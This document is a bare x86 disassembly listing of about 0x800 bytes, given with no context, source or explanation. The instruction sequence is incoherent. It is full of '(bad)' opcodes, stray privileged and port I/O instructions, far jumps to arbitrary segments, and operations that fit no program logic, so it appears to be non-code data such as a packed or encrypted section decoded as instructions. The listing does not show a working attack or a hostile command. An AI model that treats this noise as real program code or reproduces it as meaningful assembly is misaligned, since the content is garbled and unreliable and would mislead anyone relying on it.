  4175d7:	ret    
  4175d8:	mov    edi,0xe8aef670
  4175dd:	stc    
  4175de:	and    edi,DWORD PTR [ebp-0x35740532]
  4175e4:	fdiv   QWORD PTR ss:[edi-0x4a]
  4175e8:	xor    DWORD PTR [ebx-0x36],edx
  4175eb:	leave  
  4175ec:	das    
  4175ed:	dec    edx
  4175ee:	int3   
  4175ef:	dec    edi
  4175f0:	sahf   
  4175f1:	mov    ch,0x77
  4175f3:	sti    
  4175f4:	frstor [ecx]
  4175f6:	aam    0xff
  4175f8:	not    BYTE PTR [eax+0x23]
  4175fb:	mov    gs:0xb0fb119d,eax
  417601:	pusha  
  417602:	ins    DWORD PTR es:[edi],dx
  417603:	ss xchg edx,eax
  417605:	jno    0x4175e9
  417607:	ds mov eax,0x8306c521
  41760d:	mov    esi,DWORD PTR [ebx+0x59]
  417610:	retf   0x16c8
  417613:	hlt    
  417614:	pop    esp
  417615:	lods   al,BYTE PTR ds:[esi]
  417616:	sub    eax,0x10bd5cdb
  41761b:	(bad)  
  41761c:	fucomip st,st(3)
  41761e:	inc    edx
  41761f:	ffree  st(2)
  417621:	push   ecx
  417622:	icebp  
  417623:	mov    eax,ds:0x74a1a0cd
  417628:	cdq    
  417629:	out    0xe0,al
  41762b:	sbb    al,0xa8
  41762d:	fiadd  WORD PTR [esi]
  41762f:	cmp    ch,BYTE PTR [esi-0x6]
  417632:	push   esp
  417633:	leave  
  417634:	ins    DWORD PTR es:[edi],dx
  417635:	xchg   ecx,eax
  417636:	jl     0x4176a2
  417638:	jmp    0x2ce8:0x240a5979
  41763f:	outs   dx,BYTE PTR ds:[esi]
  417640:	or     eax,0x5026d798
  417645:	mul    ah
  417647:	repz push esi
  417649:	rcr    BYTE PTR [eax+0x25],cl
  41764c:	sbb    al,0x2c
  41764e:	je     0x4175e6
  417650:	call   0x8e5b7b6
  417655:	push   ebx
  417656:	popf   
  417657:	pop    ds
  417658:	jle    0x4176b7
  41765a:	cmp    al,0x79
  41765c:	ror    ah,0x33
  41765f:	nop
  417660:	iret   
  417661:	imul   esi,DWORD PTR [edi+edx*4],0x5ae55963
  417668:	sbb    DWORD PTR [ebx],eax
  41766a:	jp     0x417655
  41766c:	cmc    
  41766d:	jg     0x4176bf
  41766f:	xchg   ebx,eax
  417670:	mov    ah,0xed
  417672:	xchg   edx,eax
  417673:	mov    al,ah
  417675:	in     al,dx
  417676:	jle    0x417657
  417678:	xor    al,0x20
  41767a:	or     ah,BYTE PTR [edi+0x7525b5b1]
  417680:	push   0xffffffff
  417682:	and    bh,BYTE PTR [ebx-0x1c]
  417685:	add    al,0x16
  417687:	sbb    al,0xb5
  417689:	mov    bl,0x93
  41768b:	sub    edx,DWORD PTR [ebp+0x49]
  41768e:	mov    bl,0x74
  417690:	jecxz  0x41768e
  417692:	xor    DWORD PTR [edx+ecx*4],eax
  417695:	int3   
  417696:	push   0xffffff8a
  417698:	pop    ecx
  417699:	xchg   edi,eax
  41769a:	pusha  
  41769b:	adc    DWORD PTR [ecx],ecx
  41769d:	jns    0x41765c
  41769f:	(bad)  
  4176a0:	leave  
  4176a1:	sbb    ebp,DWORD PTR [edx]
  4176a3:	je     0x41767d
  4176a5:	sbb    eax,esp
  4176a7:	and    DWORD PTR [ecx],esp
  4176a9:	mov    dh,0x68
  4176ab:	not    BYTE PTR [ebx]
  4176ad:	aas    
  4176ae:	jmp    0xe948eb2f
  4176b3:	mov    dh,0x25
  4176b5:	imul   ebx,DWORD PTR [ebx],0xffffffae
  4176b8:	pop    ds
  4176b9:	xchg   ebx,eax
  4176ba:	aas    
  4176bb:	mov    ah,0xf3
  4176bd:	es into 
  4176bf:	cmc    
  4176c0:	cmp    eax,0xfc06ed56
  4176c5:	lods   al,BYTE PTR ds:[esi]
  4176c6:	retf   
  4176c7:	mov    eax,ds:0xd44bb337
  4176cc:	sub    DWORD PTR [edi+0x2b],esp
  4176cf:	in     al,dx
  4176d0:	jno    0x417733
  4176d2:	inc    edi
  4176d3:	mov    al,ds:0x263595f1
  4176d8:	cs sbb al,0x5b
  4176db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176dc:	push   0x8
  4176de:	push   ss
  4176df:	aaa    
  4176e0:	dec    eax
  4176e1:	or     al,0x90
  4176e3:	cmp    al,0xd9
  4176e5:	jae    0x4176de
  4176e7:	retf   0x5f58
  4176ea:	and    DWORD PTR [edi+0x6769cf04],edi
  4176f0:	lods   al,BYTE PTR ds:[esi]
  4176f1:	mov    eax,0x735f71eb
  4176f6:	or     ah,bl
  4176f8:	and    ecx,DWORD PTR [edx-0x6a70d2b]
  4176fe:	pushf  
  4176ff:	jo     0x417681
  417701:	es in  al,0x8f
  417704:	mov    edi,0xcf9b133a
  417709:	push   ecx
  41770a:	adc    DWORD PTR [esi+0x0],esi
  41770d:	repnz push ebx
  41770f:	in     al,dx
  417710:	pop    es
  417711:	inc    ecx
  417712:	scas   eax,DWORD PTR es:[edi]
  417713:	add    DWORD PTR [ecx-0x38],esi
  417716:	adc    eax,0x283ac6d0
  41771b:	push   ds
  41771c:	shl    DWORD PTR [edx-0x27],cl
  41771f:	mov    al,0x86
  417721:	and    al,0x74
  417723:	jp     0x41772a
  417725:	imul   edx,DWORD PTR [ebp+0x6d],0x914900e3
  41772c:	mov    ds:0x7cc5acb5,eax
  417731:	loope  0x4176b5
  417733:	xor    al,0xa0
  417735:	and    edx,DWORD PTR [edi-0xbd9e1a]
  41773b:	add    edi,DWORD PTR [eax+0x2b22ec70]
  417741:	pop    esi
  417742:	sub    dh,BYTE PTR [ebp-0x72]
  417745:	xor    DWORD PTR [ecx+0x10],esi
  417748:	int3   
  417749:	mov    ch,0x94
  41774b:	xor    al,0xd
  41774d:	hlt    
  41774e:	jp     0x41772b
  417750:	jg     0x4177cb
  417752:	lds    eax,FWORD PTR [edx]
  417754:	and    eax,0xa6ba32e7
  417759:	scas   al,BYTE PTR es:[edi]
  41775a:	push   ebx
  41775b:	xchg   esi,eax
  41775c:	imul   esp,DWORD PTR [esi],0xffffffdd
  41775f:	jp     0x417785
  417761:	mov    BYTE PTR [eax],bl
  417763:	mov    ebp,DWORD PTR [edi]
  417765:	sub    DWORD PTR [eax+ebx*1-0x76],ebp
  417769:	push   0x65a7912f
  41776e:	aaa    
  41776f:	arpl   dx,dx
  417771:	sahf   
  417772:	aad    0xb4
  417774:	xchg   DWORD PTR [ebx-0x11],ebx
  417777:	mov    edx,0x9ce52269
  41777c:	inc    ebp
  41777d:	push   esi
  41777e:	jns    0x4177f9
  417780:	cmp    edx,DWORD PTR ds:0xb9e8424f
  417786:	(bad)  
  417788:	push   eax
  417789:	shl    ebp,1
  41778b:	das    
  41778c:	sub    DWORD PTR [ebp-0x67],esi
  41778f:	pop    ebx
  417790:	xor    al,BYTE PTR [ebx]
  417792:	push   ss
  417793:	push   eax
  417794:	sub    bh,BYTE PTR [ecx+0x69bd79ee]
  41779a:	adc    DWORD PTR [edx+0x7e],edx
  41779d:	push   es
  41779e:	add    DWORD PTR [ebx-0x41],eax
  4177a1:	pop    edi
  4177a2:	inc    ecx
  4177a3:	(bad)  
  4177a4:	sub    eax,0xee9289ce
  4177a9:	scas   eax,DWORD PTR es:[edi]
  4177aa:	lea    eax,[edx+ebp*8]
  4177ad:	fld    QWORD PTR [ebp+0x25]
  4177b0:	or     bl,dh
  4177b2:	cmp    dh,ah
  4177b4:	mov    esi,0x3eb62bcf
  4177b9:	data16 jl 0x4177f8
  4177bc:	mov    bh,0x5
  4177be:	xchg   ecx,eax
  4177bf:	gs loop 0x417799
  4177c2:	icebp  
  4177c3:	or     bl,cl
  4177c5:	mov    ebp,DWORD PTR ds:0x95f323b5
  4177cb:	inc    esi
  4177cc:	aad    0x30
  4177ce:	inc    edx
  4177cf:	test   BYTE PTR [edx+eax*1-0x7c],0x20
  4177d4:	jb     0x417804
  4177d6:	xor    eax,0xd68c57a4
  4177db:	jbe    0x41776f
  4177dd:	icebp  
  4177de:	lods   eax,DWORD PTR ds:[esi]
  4177df:	cmp    al,0x30
  4177e1:	ss (bad) 
  4177e3:	nop
  4177e4:	cwde   
  4177e5:	add    cl,BYTE PTR ss:[ebp*8+0x5e994ed6]
  4177ed:	in     eax,dx
  4177ee:	das    
  4177ef:	dec    edi
  4177f0:	call   0x295982a0
  4177f5:	mov    dl,0xce
  4177f7:	call   0xc589917e
  4177fc:	rol    DWORD PTR [ebx+0xd],0x0
  417800:	nop
  417801:	rcr    BYTE PTR [ecx+0x594a33e8],0x38
  417808:	jmp    0xa034:0x9aa610c7
  41780f:	(bad)  
  417810:	sbb    BYTE PTR [ebx],dl
  417812:	push   ss
  417813:	mov    esp,0x11c36085
  417818:	xor    DWORD PTR [eax+0x7c399842],eax
  41781e:	xor    ebx,0x5e10a6ea
  417824:	mov    ah,0xd9
  417826:	imul   edx,DWORD PTR [eax+0x5b4e45a8],0xb
  41782d:	mov    BYTE PTR [edi+0x56eebfe2],0xe7
  417834:	icebp  
  417835:	(bad)  
  417836:	fild   WORD PTR [edx+ebp*8-0x6cc4ce68]
  41783d:	inc    ecx
  41783e:	xchg   ecx,eax
  41783f:	push   ds
  417840:	xchg   ebp,eax
  417841:	sub    BYTE PTR [eax],ch
  417843:	pushf  
  417844:	fisttp DWORD PTR [ebx]
  417846:	mov    bl,0xca
  417848:	jl     0x4178ad
  41784a:	adc    eax,0x6f292ddd
  41784f:	rol    DWORD PTR [edi+0x56],0x59
  417853:	cs inc ecx
  417855:	arpl   WORD PTR [eax+0x49],si
  417858:	adc    BYTE PTR [edx-0x1],dl
  41785b:	in     al,0x89
  41785d:	mov    ds:0xd2f4c3e4,eax
  417862:	imul   ebx,edi,0x39777b15
  417868:	add    DWORD PTR [ebx],0x54ffb1d2
  41786e:	xchg   ebp,eax
  41786f:	repz and al,0x40
  417872:	shl    DWORD PTR [edi],cl
  417874:	mov    ds:0x72678e0a,al
  417879:	sahf   
  41787a:	scas   eax,DWORD PTR es:[edi]
  41787b:	dec    BYTE PTR [ecx-0x2a1d2c3d]
  417881:	repnz pop esp
  417883:	mov    bl,0x7a
  417885:	ss into 
  417887:	and    eax,0xac898cf0
  41788c:	sahf   
  41788d:	sar    DWORD PTR [edi+0x2f],0xc6
  417891:	shl    esp,0x9e
  417894:	mov    esi,0x777460a9
  417899:	pushf  
  41789a:	or     DWORD PTR [eax],edi
  41789c:	jmp    0x4178c9
  41789e:	fstp   QWORD PTR [ebx]
  4178a0:	push   edx
  4178a1:	sbb    esi,DWORD PTR [edi]
  4178a3:	mov    dh,0x18
  4178a5:	push   esp
  4178a6:	pop    ss
  4178a7:	cmp    eax,0xfc0a12b6
  4178ac:	pop    esi
  4178ad:	xchg   edx,eax
  4178ae:	mov    cl,0xc0
  4178b0:	loopne 0x4178eb
  4178b2:	imul   eax,ebp,0x770b4a86
  4178b8:	pop    eax
  4178b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178ba:	and    eax,0x744f5dba
  4178bf:	dec    esi
  4178c0:	dec    edx
  4178c1:	mov    ebx,?
  4178c3:	dec    esi
  4178c4:	outs   dx,DWORD PTR ds:[esi]
  4178c5:	jmp    DWORD PTR [edi-0x3f]
  4178c8:	sub    bl,ah
  4178ca:	jge    0x41792e
  4178cc:	xchg   ebp,eax
  4178cd:	iret   
  4178ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178cf:	fistp  WORD PTR [ebx-0x60]
  4178d2:	dec    BYTE PTR [ebx]
  4178d4:	or     al,0x6f
  4178d6:	int    0x95
  4178d8:	pop    ebx
  4178d9:	add    DWORD PTR [edi+0x2f33ab28],ebx
  4178df:	mov    bh,0x9a
  4178e1:	and    BYTE PTR [ecx-0x43f72217],cl
  4178e7:	sub    al,0x39
  4178e9:	inc    ebp
  4178ea:	pop    edx
  4178eb:	rcl    cl,cl
  4178ed:	js     0x41793c
  4178ef:	push   edi
  4178f0:	clc    
  4178f1:	pushf  
  4178f2:	gs xchg edx,eax
  4178f4:	pop    edx
  4178f5:	mov    dl,0x1c
  4178f7:	enter  0xddbb,0xed
  4178fb:	fwait
  4178fc:	adc    BYTE PTR [ecx+0x21c5572b],0x21
  417903:	test   BYTE PTR [esi-0x7],0xee
  417907:	push   0xffffffca
  417909:	pop    ebp
  41790a:	lock test DWORD PTR [edi],ebp
  41790d:	add    bl,BYTE PTR [edx]
  41790f:	jg     0x417983
  417911:	dec    esi
  417912:	data16 ja 0x417983
  417915:	mov    ebx,0xc1c36ce4
  41791a:	jg     0x4178ec
  41791c:	push   edi
  41791d:	mov    cl,0x54
  41791f:	popf   
  417920:	xlat   BYTE PTR ds:[ebx]
  417921:	ffreep st(6)
  417923:	xchg   ebx,eax
  417924:	retf   
  417925:	push   edi
  417926:	xor    eax,0x6e9af73d
  41792b:	push   ss
  41792c:	sbb    eax,DWORD PTR ss:[edx+ebp*1+0x2e1ae8f0]
  417934:	pop    esi
  417935:	(bad)  
  417936:	(bad)  
  417937:	(bad)  
  417938:	push   eax
  417939:	cmp    eax,0x84b1e654
  41793e:	cmp    eax,0x29cd6edb
  417943:	mov    edi,0x88d656ae
  417948:	xchg   esp,eax
  417949:	and    BYTE PTR ds:0x6cc43fe0,bh
  41794f:	adc    eax,esp
  417951:	sub    eax,0x61da11ef
  417956:	icebp  
  417957:	lock imul BYTE PTR [ecx]
  41795a:	dec    esi
  41795b:	adc    eax,0xda5d0aac
  417960:	mov    ah,0xc9
  417962:	test   BYTE PTR [ebx-0x64],bl
  417965:	pop    ss
  417966:	mov    bl,0x7a
  417968:	loop   0x41792c
  41796a:	adc    al,BYTE PTR [eax]
  41796c:	aad    0x16
  41796e:	mov    db4,ecx
  417971:	in     eax,dx
  417972:	add    dl,BYTE PTR [ebp+0x7b]
  417975:	inc    edi
  417976:	pop    es
  417977:	inc    edi
  417978:	xchg   ebp,eax
  417979:	and    dl,BYTE PTR [ebp+0x22]
  41797c:	push   ds
  41797d:	shl    BYTE PTR [ecx+edi*4],1
  417980:	cmp    al,BYTE PTR [ecx-0x35]
  417983:	cwde   
  417984:	jbe    0x417990
  417986:	and    ebp,ecx
  417988:	aas    
  417989:	mov    BYTE PTR [esp+edi*8-0x4e970375],dl
  417990:	dec    ebx
  417991:	aas    
  417992:	cmp    ch,dl
  417994:	xor    eax,0xe5966ed6
  417999:	ins    DWORD PTR es:[edi],dx
  41799a:	cmp    ch,BYTE PTR [edx-0x3ab693a6]
  4179a0:	pop    edi
  4179a1:	js     0x4179be
  4179a3:	retf   
  4179a4:	shr    BYTE PTR [ecx],0x55
  4179a7:	lods   eax,DWORD PTR ds:[esi]
  4179a8:	adc    al,0x6e
  4179aa:	mov    edx,0x42a0ef64
  4179af:	pushf  
  4179b0:	mov    DWORD PTR [eax-0x11],ecx
  4179b3:	aaa    
  4179b4:	sbb    BYTE PTR [edi+0x5a38cc77],bh
  4179ba:	out    0x80,al
  4179bc:	and    dh,ah
  4179be:	fidiv  DWORD PTR [eax-0x1b]
  4179c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179c2:	inc    ebx
  4179c3:	shr    BYTE PTR [eax+0x4ced5226],1
  4179c9:	adc    al,0xf6
  4179cb:	mov    dh,0xfb
  4179cd:	mov    dl,0x6c
  4179cf:	ds in  eax,dx
  4179d1:	arpl   WORD PTR ss:[ecx+edi*2-0x3070a8db],ax
  4179d9:	lds    ecx,FWORD PTR [edi+0x48ba73e9]
  4179df:	sbb    al,0xf6
  4179e1:	repnz lahf 
  4179e3:	sbb    BYTE PTR [eax-0x55],dl
  4179e6:	icebp  
  4179e7:	sti    
  4179e8:	mov    ds:0x9abca679,al
  4179ed:	scas   eax,DWORD PTR es:[edi]
  4179ee:	sub    esi,esp
  4179f0:	mov    ds:0x8645e182,al
  4179f5:	pop    eax
  4179f6:	adc    al,0xb2
  4179f8:	test   DWORD PTR [ebx],ebp
  4179fa:	or     ch,BYTE PTR [esi-0x152ba8d3]
  417a00:	push   edx
  417a01:	scas   al,BYTE PTR es:[edi]
  417a02:	or     edx,edx
  417a04:	out    dx,al
  417a05:	jae    0x4179dd
  417a07:	fisubr DWORD PTR [esp+eiz*4+0x82364f0]
  417a0e:	leave  
  417a0f:	in     eax,dx
  417a10:	cmp    al,0x63
  417a12:	jecxz  0x4179e2
  417a14:	test   BYTE PTR [edi],dh
  417a16:	push   es
  417a17:	mov    dl,0x33
  417a19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a1a:	int3   
  417a1b:	and    edx,DWORD PTR [ebx]
  417a1d:	out    0x58,al
  417a1f:	jae    0x4179a9
  417a21:	mov    al,ds:0xb7012e0b
  417a26:	loop   0x4179bb
  417a28:	dec    edi
  417a2a:	mov    ds:0xc83088a1,eax
  417a2f:	loop   0x417a6c
  417a31:	scas   al,BYTE PTR es:[edi]
  417a32:	xor    eax,0xe217f45
  417a37:	jle    0x4179dd
  417a39:	adc    ch,dh
  417a3b:	ins    DWORD PTR es:[edi],dx
  417a3c:	cmp    al,0x69
  417a3e:	push   es
  417a3f:	stc    
  417a40:	jno    0x417a76
  417a42:	pop    edx
  417a43:	mov    dh,0x34
  417a45:	outs   dx,DWORD PTR ds:[esi]
  417a46:	pop    eax
  417a48:	ins    DWORD PTR es:[edi],dx
  417a49:	shl    DWORD PTR [ebp+0x7c6ca9f3],1
  417a4f:	enter  0x5527,0xaa
  417a53:	and    esp,DWORD PTR [ecx+0x11]
  417a56:	cmc    
  417a57:	mov    ebx,0x25496606
  417a5c:	mov    al,BYTE PTR [edi+0x36]
  417a5f:	ret    0x58c
  417a62:	add    bl,BYTE PTR [ebx]
  417a64:	stos   BYTE PTR es:[edi],al
  417a65:	pop    esp
  417a66:	sub    ecx,edi
  417a68:	adc    ebp,DWORD PTR [eax-0x30]
  417a6b:	inc    ecx
  417a6c:	pop    ebx
  417a6d:	jo     0x417a44
  417a6f:	push   esi
  417a70:	addr16 jno 0x417a3f
  417a73:	sbb    eax,0x273b26fd
  417a78:	and    BYTE PTR [eax],ch
  417a7a:	imul   DWORD PTR [ecx-0x35a712aa]
  417a80:	add    al,0x61
  417a82:	retf   0x929e
  417a85:	pop    ebp
  417a86:	sahf   
  417a87:	and    DWORD PTR [edx+0xaee3c31],0x27
  417a8e:	jg     0x417ae6
  417a90:	fcom   QWORD PTR [ecx-0x7fc14589]
  417a96:	inc    esi
  417a97:	mov    ds:0xedd9e8aa,al
  417a9c:	cmp    ah,BYTE PTR [ebx]
  417a9e:	pop    esp
  417a9f:	jle    0x417a5f
  417aa1:	push   edx
  417aa2:	add    al,0xba
  417aa4:	inc    ebp
  417aa5:	cwde   
  417aa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417aa7:	xor    DWORD PTR [edx],edi
  417aa9:	(bad)  
  417aaa:	fldcw  WORD PTR [edi+0x25fe1d71]
  417ab0:	xor    al,BYTE PTR [esi+ecx*1+0x3a021f22]
  417ab7:	push   es
  417ab8:	xor    BYTE PTR [edi+0x4c48fb18],cl
  417abe:	sbb    al,0xc9
  417ac0:	mov    ds:0x43208c5c,al
  417ac5:	adc    bh,ch
  417ac7:	add    DWORD PTR [ecx+eiz*4-0x50381153],esi
  417ace:	loope  0x417aa5
  417ad0:	add    eax,DWORD PTR [edx+0x10c13035]
  417ad6:	popa   
  417ad7:	or     DWORD PTR [esi],edi
  417ad9:	jb     0x417b22
  417adb:	arpl   WORD PTR [ebp+0x86d9bc7],dx
  417ae1:	sub    BYTE PTR [eax-0x3fdf5c43],cl
  417ae7:	outs   dx,DWORD PTR ds:[esi]
  417ae8:	fist   WORD PTR [ebx+0x40349409]
  417aee:	sbb    bl,BYTE PTR [esi]
  417af0:	pop    DWORD PTR [ebp-0x37]
  417af3:	push   esp
  417af4:	sahf   
  417af5:	sbb    BYTE PTR [ebx],cl
  417af7:	shr    BYTE PTR [eax-0x6c],cl
  417afa:	push   edi
  417afb:	sbb    al,0x3a
  417afd:	dec    edi
  417afe:	pop    ebx
  417aff:	adc    BYTE PTR [ebp-0x52],cl
  417b02:	in     al,0x80
  417b04:	mov    ah,BYTE PTR [esp+ebx*2+0x3fed4f62]
  417b0b:	daa    
  417b0c:	push   ss
  417b0d:	or     ebp,DWORD PTR [ebx+0x4bd8ecb7]
  417b13:	(bad)  
  417b14:	bnd jo 0x417b47
  417b17:	repnz inc ebx
  417b19:	sub    esp,ecx
  417b1b:	fsub   QWORD PTR [esi]
  417b1d:	daa    
  417b1e:	mov    esi,0xd2319bf2
  417b23:	call   0xd711:0x1bbb8fb4
  417b2a:	pop    es
  417b2b:	rcr    DWORD PTR [edx-0x62a5dcc9],cl
  417b31:	jbe    0x417b23
  417b33:	inc    esp
  417b34:	data16 jns 0x417b4b
  417b37:	adc    eax,0xad410e29
  417b3d:	into   
  417b3e:	jmp    DWORD PTR [edx+0x30]
  417b41:	stc    
  417b42:	out    0xf7,al
  417b44:	aad    0x4f
  417b46:	push   ecx
  417b47:	aaa    
  417b48:	xchg   ecx,eax
  417b49:	mov    edx,0x2a2bf913
  417b4e:	out    dx,al
  417b4f:	and    al,0x8
  417b51:	xchg   esp,eax
  417b52:	inc    ebp
  417b53:	xchg   edi,eax
  417b54:	mov    ebx,edi
  417b56:	adc    eax,0x2d15b287
  417b5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b5c:	cmp    BYTE PTR [ecx-0x7],ah
  417b5f:	arpl   WORD PTR [edx+0x5998c3c4],ax
  417b65:	pop    edi
  417b66:	lods   al,BYTE PTR ds:[esi]
  417b67:	xor    BYTE PTR [ebp+0x27],cl
  417b6a:	loopne 0x417bac
  417b6c:	repnz sar BYTE PTR [edx],1
  417b6f:	sub    dl,ah
  417b71:	jnp    0x417b2b
  417b73:	pop    esi
  417b74:	repz mov ecx,0x63e08850
  417b7a:	push   es
  417b7b:	popf   
  417b7c:	and    al,0x6d
  417b7e:	int    0xc7
  417b80:	(bad)  
  417b81:	jne    0x417bde
  417b83:	cli    
  417b84:	lods   eax,DWORD PTR ds:[esi]
  417b85:	stos   DWORD PTR es:[edi],eax
  417b86:	repz scas eax,DWORD PTR es:[edi]
  417b88:	xchg   ebp,eax
  417b89:	fnstsw WORD PTR [edx]
  417b8b:	mov    bh,dh
  417b8d:	push   edi
  417b8e:	cmp    al,0xe3
  417b90:	adc    DWORD PTR [edi+0x37ebeb54],edx
  417b96:	mov    eax,ds:0xec92525d
  417b9b:	adc    al,bh
  417b9d:	inc    edx
  417b9e:	popa   
  417b9f:	cmp    al,0x70
  417ba1:	and    ebp,DWORD PTR [ebx-0x20127582]
  417ba7:	test   BYTE PTR [esi-0x52f9d2e4],0x48
  417bae:	shl    DWORD PTR [ecx-0x4d11b4a1],1
  417bb4:	add    dl,BYTE PTR [ecx-0x50caa58e]
  417bba:	aaa    
  417bbb:	or     al,BYTE PTR [ecx-0x1395b5d2]
  417bc1:	enter  0xa3ae,0xe9
  417bc5:	mov    edx,fs
  417bc7:	std    
  417bc8:	ret    0xc74d
  417bcb:	sbb    DWORD PTR [ebp+0x60],esi
  417bce:	cmp    ch,BYTE PTR [ebx]
  417bd0:	mov    edi,DWORD PTR [ebx]
  417bd2:	iret   
  417bd3:	inc    edi
  417bd4:	mov    ecx,DWORD PTR [eax-0x61]
  417bd7:	push   cs
  417bd8:	bound  ebx,QWORD PTR [ebx]
  417bda:	jmp    0xb032:0xbfb3b179
  417be1:	fdiv   DWORD PTR ds:0xa4cf44fe
  417be7:	jmp    0x2ee0:0x8568f723
  417bee:	ret    0x598
  417bf1:	mov    bh,0x86
  417bf3:	cmp    al,0x86
  417bf5:	inc    esi
  417bf6:	lods   eax,DWORD PTR ds:[esi]
  417bf7:	dec    edi
  417bf8:	add    DWORD PTR [ecx+ebx*4],ebx
  417bfb:	cld    
  417bfc:	ds (bad) 
  417bfe:	in     eax,dx
  417bff:	leave  
  417c00:	or     al,0xe2
  417c02:	jmp    0x7ff:0xb7912352
  417c09:	xchg   BYTE PTR cs:[ecx],bl
  417c0c:	cmp    cl,dh
  417c0e:	or     ebp,DWORD PTR [eax-0x60c9cb71]
  417c14:	mov    esp,0xdde97b8b
  417c19:	(bad)  
  417c1a:	std    
  417c1b:	stc    
  417c1c:	push   ecx
  417c1d:	fs loope 0x417c29
  417c20:	out    dx,eax
  417c21:	sub    DWORD PTR [eax+0x21],ecx
  417c24:	push   0x28
  417c26:	lock mov edi,0x99cf1d5a
  417c2c:	mov    ch,0x5d
  417c2e:	mov    dl,0xd3
  417c30:	test   al,0x67
  417c32:	sbb    BYTE PTR [edx-0x18],0x31
  417c36:	jnp    0x417ca0
  417c38:	or     al,BYTE PTR [ebx]
  417c3a:	(bad)  
  417c3b:	aam    0x44
  417c3d:	jle    0x417c22
  417c3f:	scas   eax,DWORD PTR es:[edi]
  417c40:	test   DWORD PTR [ecx],edi
  417c42:	fmul   DWORD PTR [ecx]
  417c44:	push   es
  417c45:	call   0xe445550b
  417c4a:	cmp    al,0xfc
  417c4c:	test   al,0xa6
  417c4e:	loop   0x417cc2
  417c50:	in     eax,0xc9
  417c52:	inc    ecx
  417c53:	add    al,0x62
  417c55:	xchg   DWORD PTR [edi],ecx
  417c57:	enter  0x8e0f,0xd7
  417c5b:	or     DWORD PTR [edx-0x578a281f],esi
  417c61:	xor    al,BYTE PTR [ebp+0x2947928d]
  417c67:	dec    esp
  417c68:	add    al,0x7
  417c6a:	imul   esi,DWORD PTR [ebx-0x35],0xffffff96
  417c6e:	inc    esp
  417c6f:	add    al,al
  417c71:	mov    esp,0xd48162e2
  417c76:	or     dl,BYTE PTR [edx+0x3745e573]
  417c7c:	daa    
  417c7d:	cmc    
  417c7e:	inc    edx
  417c7f:	mov    BYTE PTR ds:0xd96fd4aa,bh
  417c85:	push   0xffffffc1
  417c87:	inc    esi
  417c88:	cmp    dh,BYTE PTR ds:0x8a63b00a
  417c8e:	jmp    0x417ca7
  417c90:	dec    ecx
  417c91:	rcl    BYTE PTR [edi+0x31],cl
  417c94:	in     al,dx
  417c95:	inc    ebx
  417c96:	out    dx,al
  417c97:	test   BYTE PTR [ebp-0x17086a3b],al
  417c9d:	fnstenv [edx]
  417c9f:	data16 shl BYTE PTR [ebp-0x58d298b2],0x4
  417ca7:	in     al,0x46
  417ca9:	fdivr  st(2),st
  417cab:	(bad)  
  417cac:	jge    0x417ca5
  417cae:	adc    ebp,DWORD PTR [edx+0x43]
  417cb1:	ss add eax,0xc3757f01
  417cb7:	repnz test eax,0x92060ae
  417cbd:	into   
  417cbe:	push   es
  417cbf:	adc    DWORD PTR [edi+esi*1+0x7b],edx
  417cc3:	maskmovq mm2,(bad)
  417cc4:	not    DWORD PTR [esp+eax*4+0x14]
  417cc8:	retf   0xb4fa
  417ccb:	in     eax,0x5f
  417ccd:	ss fcom st(2)
  417cd0:	addr16 inc ebp
  417cd2:	sbb    edi,edx
  417cd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cd5:	jmp    0xdba1:0x93c38fe7
  417cdc:	or     al,0x1e
  417cde:	mov    ah,0x49
  417ce0:	das    
  417ce1:	loopne 0x417ccd
  417ce3:	xchg   esi,eax
  417ce4:	xor    esi,DWORD PTR [eax+0xb]
  417ce7:	mov    ds:0xab9abd0d,al
  417cec:	mov    ecx,0x66df8985
  417cf1:	inc    DWORD PTR [edi-0x5958d007]
  417cf7:	mov    al,ds:0x1f74ecd6
  417cfc:	shl    BYTE PTR [ebp+edi*8+0x11],0x13
  417d01:	jg     0x417cce
  417d03:	dec    esi
  417d04:	imul   esi,DWORD PTR [ebp-0x7d72dbd4],0x2b4625bb
  417d0e:	mov    dl,0xc0
  417d10:	cwde   
  417d11:	(bad)  
  417d13:	inc    edx
  417d14:	lods   al,BYTE PTR ds:[esi]
  417d15:	(bad)  
  417d17:	mov    BYTE PTR [ecx],dh
  417d19:	xor    edi,DWORD PTR [esi+0x64]
  417d1c:	pop    esp
  417d1d:	inc    ecx
  417d1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d1f:	add    DWORD PTR [ebx+0x7c],ecx
  417d22:	dec    esi
  417d23:	rcl    ch,cl
  417d25:	push   ecx
  417d26:	cmp    al,0x5c
  417d28:	and    BYTE PTR [ebx],dl
  417d2a:	in     eax,dx
  417d2b:	sub    ecx,DWORD PTR cs:[edx]
  417d2e:	dec    ecx
  417d2f:	fwait
  417d30:	(bad)  
  417d31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d32:	inc    eax
  417d33:	xchg   edi,eax
  417d34:	sbb    BYTE PTR [ebx-0x34ed0ea4],dh
  417d3a:	les    eax,FWORD PTR [eax]
  417d3c:	mov    edi,0xd5d81ccd
  417d41:	popf   
  417d42:	sti    
  417d43:	fiadd  DWORD PTR [edx]
  417d45:	int    0x68
  417d47:	test   al,0xbe
  417d49:	leave  
  417d4a:	out    0x1e,al
  417d4c:	xchg   esi,eax
  417d4d:	es fsqrt 
  417d50:	mov    WORD PTR [ebp+0x31de388c],?
  417d56:	pop    edx
  417d57:	(bad)  
  417d59:	jbe    0x417d88
  417d5b:	cmp    dl,BYTE PTR [eax+eax*1]
  417d5e:	or     edx,ebx
  417d60:	std    
  417d61:	push   eax
  417d62:	jl     0x417cf4
  417d64:	inc    esp
  417d65:	fiadd  WORD PTR [ebp-0x10]
  417d68:	add    eax,0x1e266fc9
  417d6d:	dec    ebx
  417d6e:	xor    edi,DWORD PTR [ebx]
  417d70:	pusha  
  417d71:	aad    0x3b
  417d73:	mov    ds:0xcf8175d9,eax
  417d78:	adc    al,0xf
  417d7a:	sub    ch,BYTE PTR [eax+0x2e3db412]
  417d80:	jne    0x417d27
  417d82:	(bad)  
